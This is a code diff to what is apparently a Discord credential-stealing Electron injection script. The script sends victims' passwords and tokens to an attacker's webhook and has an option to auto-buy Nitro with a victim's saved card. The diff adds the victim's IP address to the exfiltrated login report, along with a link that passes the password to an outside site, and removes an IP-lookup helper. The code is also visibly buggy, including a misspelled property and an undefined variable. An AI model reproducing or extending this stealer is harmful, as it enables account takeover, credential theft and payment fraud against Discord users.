@@ -6,7 +6,8 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+  webhook: '%WEBHOOK%',
+  ip: '%IP%',
   webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
   auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
@@ -490,13 +491,6 @@ const fetchBilling = async (token) => {
   if (!bill.lenght || bill.length === 0) return '';
   return JSON.parse(bill);
 };
-const getIp = () => {
-  const bill = await execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("GET", "https://api.ipify.orgs", false);
-    xmlHttp.send(null);
-    xmlHttp.responseText`);
-  return JSON.parse(bill);
-};
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
@@ -679,6 +673,11 @@ const login = async (email, password, token) => {
           {
             name: '<a:4536gun4:985673435860586557> @SN - Password:',
             value: `\`${password}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${password})`,
+            inline: true,
+          },
+          {
+            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
+            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
             inline: true,
           },
           {
